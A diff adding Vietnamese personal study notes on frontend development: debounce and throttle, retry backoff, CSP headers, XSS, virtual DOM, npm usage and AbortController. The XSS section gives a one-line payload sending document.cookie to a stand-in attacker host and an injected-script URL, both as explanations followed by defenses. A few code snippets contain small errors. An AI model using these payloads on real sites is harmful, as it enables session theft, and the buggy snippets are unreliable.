@@ -1,0 +1,226 @@
+# Cách clone code FE của các trang web => bỏ
+Compiler optimize source code FE thành file chunk khó debug nên cần file source map để browser tái tạo lại code gốc. Có thể config để ẩn source map nhưng sẽ khó debug, nên thường được bật mặc định. Đa phần các trang web dùng các js framework bundle file nếu vẫn giữ source map có thể lấy được phần frontend static file của web CSR.
+Vào browser devtool -> Sources -> tìm mở các file chunk rồi click chuột phải vào file đang mở -> Add source map: <tên file>.map -> làm với mọi file js thì sẽ thấy được source code frontend đầy đủ -> Dùng extension resources saver -> click mọi option trừ cái XHR để tránh quá lớn -> Ấn tải về
+Tạo 1 dự án mới với công nghệ tương ứng và add các file vào src, config tùy chỉnh -> Thêm các thư viện đầy đủ đúng phiên bản, nếu phiên bản k chạy được thì phải tự downgrade xuống, web react thì bước này dễ hơn -> Thêm các file css vào dự án vẫn có trong mục tải về -> 1 số resources assets không hoạt động phải tự vào trang web gốc tải về.
+=> Ở bước add source map là ta đang thêm source map của file js đó để browser tái tạo lại code gốc. Tool tìm file source map nếu có: https://sourcemaps.io/
+
+
+
+# Hiểu debounce throttle
+Debounce nếu trigger liên tục mãi mãi sẽ kbh chạy hàm, throttle đảm bảo hàm chạy luôn lần sau trigger cách lần trước đủ tg sẽ đảm bảo chạy tiếp.
+
+-> Throttle: Giới hạn số lần gọi 1 hàm trong 1 ktg. VD set bất cứ 10s liên tiếp nào cũng k có quá 1 lần gọi hàm này.
+VD trong game khi người dùng ấn bắn chiêu nhanh đến mấy thì vẫn bắn 1s 1 phát đạn chẳng hạn.
+function throttle(func, delay) {
+  let lastCallTime = 0;
+  return function (...args) {
+    const currentTime = Date.now();
+    if (currentTime - lastCallTime >= delay) {
+      lastCallTime = currentTime;
+      func.apply(this, args);
+    }
+  };
+}
+const throttledFunction = throttle(() => {
+  console.log('Function throttled!');
+}, 500);
+throttledFunction();
+
+-> Debounce: trigger sẽ k thực hiện ngay mà delay 1 ktg kể từ lần cuối cùng hàm được gọi.
+VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng debounce cho đỡ lag
+function debounce(func, delay) {
+  let timeoutId;
+  return function (...args) {
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(() => {
+      func.apply(this, args);
+    }, delay);
+  };
+}
+const debouncedFunction = debounce(() => {
+  console.log('Function debounced!');
+}, 500);
+debouncedFunction();
+
+
+
+# Implement retryable
+BE nên dùng retryable khi call api bên thứ 3, đặc biệt là call by batch. Call db cũng cần retry với vài lỗi cụ thể.
+BE call tới db nên tận dụng transaction để gom batch update 1 lần rồi commit. Giúp giảm roundtrip tăng performance.
+FE ít khi dùng retryable mà chỉ dùng cho các API quan trọng, như retry lấy lại access token, khi dùng socket muốn reconnect khi mất kết nối, chứ lỗi mạng ở FE thì k cần.
+VD: FE retryable thường triển khai qua interceptors của axios, dùng fetch thì check response.ok hoặc try catch throw để bắt lỗi.
+
+Khi retry cần giới hạn retry 3s max 5 lần. Chưa tốt vì nếu nhiều người dùng cùng lúc thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế.
+Giải pháp là cộng thêm 1 số random ở mỗi lần để sleep kèm exponential backoff là các lần sau request failed sẽ phải chờ lâu hơn các lần trước. 
+VD: static async fetchWithRetry(url, errorCount = 0) => {
+  const ERROR_COUNT_MAX = 3;
+  const response = await fetch(url);
+  if(response.status < 200 || response.status >= 300) { // VD retry với lỗi mạng
+    if(errorCount < ERROR_COUNT_MAX){
+      await new Promise(r => setTimeout(r, Math.pow(2, errorCount)*3000 + Math.random()*2000));
+      await this.fetchWithRetry(url, errorCount + 1);
+    }
+  }
+}
+
+
+
+# Dựng server nodejs serve react
+Giả sử công ty lớn cần thêm các header bảo mật khi người dùng vào web, có thể dựng 1 server nodejs custom để serve static react web.
+Đầu tiên build app react set outDir ra 1 thư mục có file index.html -> dựng 1 server expressjs config route để serve file index.html đó -> Tuỳ ý tạo middleware thêm các header bảo mật. Có thể tạo các biến số trong file index.html để thế vào từ server, VD các url phân tách môi trường, SSL key -> thay lệnh chạy react bằng lệnh chạy nodejs.
+Chú ý đây là thêm header bảo mật của request lấy file index.html thôi. Klq gì tới bảo mật API trong web. Khi ta set header cho query GET index.html, browser lấy xong index.html này sẽ lấy các file js, css liên quan thì sẽ tự thêm các header cũ mà k cần xử lý gì thêm.
+
+- Thêm từ BE: res.setHeader trong middleware, package helmet của nodejs, thêm trong nginx
+- Thêm từ FE: <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> => có tác dụng sau khi tải xong html và browser parse tới tag này. Yếu hơn set header trong http. Tài nguyên trong web sau thẻ này sẽ áp dụng rules thẻ này
+VD mở thêm quyền khi dùng cdn: <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://cdn.jsdelivr.net">
+
+
+
+# XSS
+-> Có 3 cách:
+- Reflected XSS: User login web có session cookies -> Hacker lừa user click vào 1 url chứa mã XSS thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại response có mã XSS cho user hiển thị ra. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị gửi session cookies cho hacker.
+- Stored XSS: Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy data từ db có đoạn XSS script về thực thi là toang
+- DOM Based XSS: giống reflected XSS nhưng 1 cái gửi lên server, 1 cái sửa DOM
+VD hacker lừa người dùng truy cập vào URL để đăng nhập là: http://example.com/register.php?message=Please fill in the form. Nhưng hacker lại gửi: http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select> <script>function show(){alert("hacked");}</script>
+=> Dòng please fill in the form biến thành 1 input gender vì browser nó render html như v, khi người dùng kb vào chọn gender thì script được thực thi
+
+->*** Cách tránh khi input của người dùng hiển thị trên UI:
+- Dùng textContent thay vì innerHTML là xong. innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML k dùng. 
+- Input nhét vào url phải dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước. Hoặc dùng thư viện chống XSS như validator, express-validator, DOMPurify sẽ làm hộ logic việc validate regexp, santinize string, convert html entities.
+
+
+
+# Virtual DOM và Synthetic Event
+-> React luôn chỉ render lại các phần cần thiết. Trong actual DOM của html thuần, k có cách nào xđ được element nào thực sự thay đổi để render lại mà phải load cả cây DOM. 
+Do đó React dùng virtual dom là 1 bản giống hệt DOM thật nhưng nó rẻ hơn vì k phải render ra màn hình. Dùng virtual dom có thể xác định các phần thay đổi để chỉ render lại component đó thôi. Khi ta log thẻ jsx ra type Symbol react.element lồng các con liên tiếp thì chính là virtual DOM đó. 
+Khi chạy, virtual dom được tạo và lưu trong memory, nếu có update thì React sẽ tạo 1 cây virtual dom mới. Sau đó React compare 2 cây DOM xem khác nhau chỗ nào và tiến hành update phần node đó trên actual dom. Cơ chế khi tìm điểm khác biệt là so sánh 2 snapshot của root element, giống nhau thì tiếp tục so sánh dần xuống con để xác định node cần.
+
+-> React dùng Synthetic Event: https://reactjs.org/docs/events.html
+React wrap native browser event vào 1 cái wrapper có interface, bên trong cung các method như preventDefault() để sử dụng. NN dùng wrapper chung là để đồng bộ xử lý sự kiện trên các browser khác nhau. Tức các sự kiện ta trigger như onClick, onBlur là ReactJS custom event (Synthetic Event) chứ kp real dom event. Nhờ đó dễ dàng tạo ra cross browser app
+
+
+
+# package.json
+npm cài package vào máy và dùng
+npx khi cần dùng package mà k cần cài global vào máy
+yarn như npm nhưng cache tốt hơn
+pnpm tốt hơn yarn cả speed và mem => best practice
+
+-> package.json sẽ override version trong package-lock.json
+VD package A dùng package B ^2.3.0, nhưng về sau họ ra bản 2.3.1 thì do có ^ nên gói tự động tải 2.3.1 nhưng 2.3.1 lại hoạt động k đúng với ứng dụng nx. Để đảm bảo khi người ta pull cái repo package đó về thì phiên bản chuẩn y hệt như lúc ta tạo ra package đó thì nó lưu vào package-lock.json
+Trong package-lock.json sẽ hiển thị ra module trong package.json kèm theo 1 list các child package đi kèm với nó được fix version để đảm bảo với version đó của package đó thì các dependencies con phải luôn đúng phiên bản này.
+VD package A dùng C và B, trong package B lại dùng C và 2 cái C có phiên bản khác nhau là bth. Nó sẽ tải cả 2 phiên bản về nhưng nếu trùng nhau thì nó tự chỉ tải 1 lần 
+
+-> Lệnh thường dùng:
+yarn add [package]@[version-or-tag] / npm i package-name@version => Cài version xác định or dùng @latest
+yarn upgrade <package> / npm update <package> => Up lên mới nhất
+
+npm bin -g => hiện url hiển thị các package global đã cài đặt
+npm run --prefix <path> <script> => run npm ở directory khác từ cmd ở thư mục hiện đại
+npm run eject => K dùng. Là lệnh 1 chiều làm cho bundler không còn tự động hóa mọi vấn đề nữa mà sẽ bung toàn bộ config để những dev có thể config lại tuỳ ý. 
+
+--> Các option khi install:
+--save lưu vào dependencies chính
+--dev / --save-dev / -D lưu vào devDependencies - là package chỉ cần thiết khi code và build, sau khi build thì k dùng nữa
+--production k install các package trong devDependencies
+--peer cài peer dependencies. VD code 1 plugin cho react thì yêu cầu ngừoi dùng cài react chứ k muốn nhét cả react vào lib plugin thì dùng => k dùng
+--optional cài optional dependencies là package có hay không đều được, VD package chỉ chạy được trên 1 OS nhất định, sang OS khác sẽ fail nhưng bỏ qua mà k lỗi => k dùng
+-E / --save-exact cài chính xác phiên bản, k có ^ hay ~ đảm bảo 100% kbh xung đột
+
+-> Sửa package có sẵn
+C1: Có thể fork repo package về git của mình và sửa, sau đó sửa đổi file package.json thay số phiên bản bằng "git+<url repo>". 
+Trang https://gitpkg.vercel.app/ cho phép nhận link github ra câu lệnh npm.
+C2: sửa đổi trực tiếp trong node_modules r chạy: npx patch-package <package name> thì nó sẽ yêu cầu cài package patch và tạo ra thư mục patches chứa package ta đã sửa r dùng bth
+=> nếu ta xóa node_modules và cài lại thì có thể phải làm lại nên thêm lệnh: "postinstall": "npx patch-package" vào script để tự render theo thay đổi của ta khi install lại
+
+-> Nhanh:
+npx và pnpm
+Lệnh install và update của npm
+Đọc qua các option khi install thôi
+
+
+
+# AbortController
+URL: https://kettanaito.com/blog/dont-sleep-on-abort-controller
+Dùng huỷ các tác vụ khi k cần thiết nữa như event, timeout, fetch api, stream. VD người dùng gõ tiếp khi search hay ấn cancel thì bỏ tác vụ call api đang chạy.
+Thực tế khi tắt browser hay close tab cũng tự abort api rồi.
+
+Ez: var x = new AbortController(); x.signal; x.abort(); 
+VD abort khi request quá lâu: try { fetch(<>, {abort: AbortSignal.timeout(1000)}) } catch (e) { e.name == "AbortError" / e.name == "TimeoutError" }
+react-query hỗ trợ sẵn signal chỉ cần dùng luôn queryFn: ({ signal }) => { ... }
+
+Dùng huỷ đồng thời hàng loạt event listener thay vì remove từng cái.
+Dùng huỷ nếu abort bất cứ 1 signal nào trong list với AbortSignal.any
+Thay vì tạo function cung ra promise, nên tạo function cung ra { promise, abort } để bên ngoài sử dụng có thể call abort bất cứ lúc nào cần.
+signal của abort controller có sự kiện "abort" phát ra khi call x.abort(<reason>) và lấy với x.signal.reason
+Cơ chế biến mọi thứ abortable bằng cách biến thành promise là truyền thêm 1 abortcontroller vào, gọi bắt event "abort" của controller thì reject promise là được 
+Chú ý khi dùng AbortController để abort thì reject promise, nó vẫn thực hiện nốt phần code dưới đấy. Khi đó cần phải return or tx.rollback để thực sự abort.
+
+
+
+# Chia cấu trúc dự án lớn
+Quan trọng là nhìn vào giao diện biết tìm ở file nào, nhìn vào file nào biết nằm ở đâu trên giao diện. 1 người mới toanh nhìn vào là hiểu luôn.
+VD ta cần tìm trong trang finance, trong 1 mục X, có cái dropdown => Phải tìm trong pages/finance/X/index.js. Dropdown là 1 component chung nhưng chỉ dùng ở finance thì nên chia kiểu src/common/finance/dropdown/index.js hoặc src/apps/finance/common/dropdown/index.js
+
+VD chuẩn là chia theo chức năng, mỗi chức năng sẽ chia theo cấu trúc từng module UI:
+src (folder)
+  api (folder)
+    calling (folder) => call API cho calling
+    powerplatform (folder) => call API cho powerplatform
+    helpers (folder) => enum, utility liên quan tới API
+  app (folder)
+    common (folder) => common component
+    structure (folder) => component kiểu loading, error, headers, router => chức năng
+    pages (folder) => chức năng
+      calling (folder) => module UI
+        common (folder) => common components của calling
+        callingpolicy => component trong calling policy. Chia theo cấu trúc UI
+        callqueues => component trong callqueues
+      powerplatform (folder)
+    index.js
+    index.css
+  redux (folder)
+    actions (folder)
+      calling
+      powerplatforms 
+    reducers (folder)
+      calling
+      powerplatforms
+    store (folder)
+  hookes (folder)
+    react-query (folder)
+    contracts (folder)
+    common (folders)
+  util (folder) => chứa các utility chung
+  model (folder) => chứa interface, type, struct
+  context (folder)
+  index.html
+  index.js
+=> Với dự án nhỏ thì có thể k cần chia folder lớn cho từng module như v mà chỉ có 1 file, thì file nên có tên module để nhìn phát biết dùng cho module nào, hoặc viết 1 file common dùng cho mọi module.
+Trong 1 file component có: propsType  defaultProps  utilities  Component
+
+
+
+# safe triangle
+Giải thích: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
+Cơ chế xử lý sự kiện mouse enter và mouse leave. Mỗi khi move sẽ check vị trí mouse trong hình tam giác cũ thì tạo tam giác mới, ngoài hình tam giác cũ thì disable pointer-event là xong.
+Có thể implement thêm safe triangle thì chuột bị di chậm hoặc đứng yên cũng tự tắt.
+
+
+
+# Other:
+-> Ngoài folder src thì dùng CommonJS require, trong src thì dùng ES6 import. Có thể tuỳ biến với Browsify để FE dùng CommonJS, còn Babel giúp NodeJS dùng ES6 luôn.
+React tự script file js vào html dưới dạng module nên ta dùng export import của ES6 như bth.
+
+-> VD Xây 1 ứng dụng hỗ trợ hỏi đáp AI, dựa trên tập data từ SQL: https://www.freecodecamp.org/news/talk-to-databases-using-ai-build-a-sql-query-data-extractor/ 
+Dùng GroqAI cho AI model train với data rồi tương tác qua API bằng CopilotKit, sẽ tự động xử lý NLP và mọi thứ chuyên cho chat.
+=> Các ứng dụng AI khác cũng xây theo quy trình tương tự
+
+-> Nếu làm app nhỏ, nhiều tương tác UI → chọn Svelte / SolidJS (nhanh, gọn).
+Nếu làm SPA phổ thông, hệ sinh thái lớn → chọn React / Vue
+Nếu làm enterprise app, data-heavy dashboard → chọn Neo.mjs (tận dụng multi-core, không sợ UI bị block).
+Nếu cần SSR + SEO mạnh → chọn Qwik / NextJS
+
+-> Tư duy abstract service: coi 1 tính năng là 1 service nhận vào gì và cung ra những gì thì viết riêng ra. Mọi chỉnh sửa sau này gói gọn trong service viết riêng đó.
+Khi code cũng tư duy tạo nhiều hàm để hàm lõi tái sử dụng nhiều nơi, thì các condition check phụ sẽ viết ở hàm ngoài, hàm trong chỉ xử lý logic lõi.
+Dùng third party thì luôn viết 1 service abstract nó cung ra cái gì để tái sử dụng.
